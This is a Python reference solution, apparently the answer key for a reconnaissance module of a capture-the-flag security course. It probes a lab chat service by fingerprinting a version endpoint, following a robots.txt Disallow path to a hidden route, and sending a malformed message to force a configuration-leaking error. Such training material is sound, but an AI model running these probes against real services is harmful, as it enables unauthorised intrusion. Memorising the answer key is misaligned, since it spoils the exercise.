"""Reference solution for Module 02 -- Reconnaissance."""
from __future__ import annotations

import json
import re

import httpx


def _flag(blob) -> str | None:
    m = re.search(r"REDSEC\{[^}]+\}", json.dumps(blob) if not isinstance(blob, str) else blob)
    return m.group(0) if m else None


def solve(endpoints: dict[str, str], drop_url: str | None) -> dict:
    s = endpoints["saas"].rstrip("/")
    flags: dict[str, str] = {}

    # fingerprint-model: build metadata endpoint hinted in the page source.
    v = httpx.get(f"{s}/api/version", timeout=10).json()
    if f := _flag(v):
        flags["fingerprint-model"] = f

    # enumerate-surfaces: robots.txt advertises the internal route.
    robots = httpx.get(f"{s}/robots.txt", timeout=10).text
    path = re.search(r"Disallow:\s*(\S+)", robots).group(1)
    internal = httpx.get(f"{s}{path}", timeout=10).json()
    if f := _flag(internal):
        flags["enumerate-surfaces"] = f

    # leak-config: malformed message -> verbose error with config dump.
    r = httpx.post(f"{s}/chat", json={"message": {"not": "a string"}}, timeout=10)
    if f := _flag(r.text):
        flags["leak-config"] = f

    return {"flags": flags}


if __name__ == "__main__":  # pragma: no cover
    import argparse
    ap = argparse.ArgumentParser(); ap.add_argument("--saas", required=True)
    a = ap.parse_args()
    print(json.dumps(solve({"saas": a.saas}, None), indent=2))
